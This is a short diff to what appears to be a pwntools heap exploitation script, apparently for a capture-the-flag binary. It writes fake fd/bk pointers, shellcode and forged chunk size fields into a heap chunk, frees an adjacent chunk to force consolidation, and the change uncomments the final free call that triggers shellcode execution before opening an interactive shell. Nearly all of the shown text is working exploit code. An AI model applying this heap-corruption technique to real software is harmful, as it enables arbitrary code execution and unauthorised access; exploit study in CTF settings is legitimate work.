@@ -69,8 +69,8 @@ prev_size = p64(0x90)
 fake_size = p64(0x90)
 edit(chunk_A, fd + bk + shellcode + p8(0)*(0x70-len(shellcode)) + prev_size + fake_size)
 
-# consolidate chuck_B woth chunk_A
+# consolidate chuck_B with chunk_A
 free(chunk_B)
 # execute shellcode
-# free(chunk_A)
+free(chunk_A)
 io.interactive()
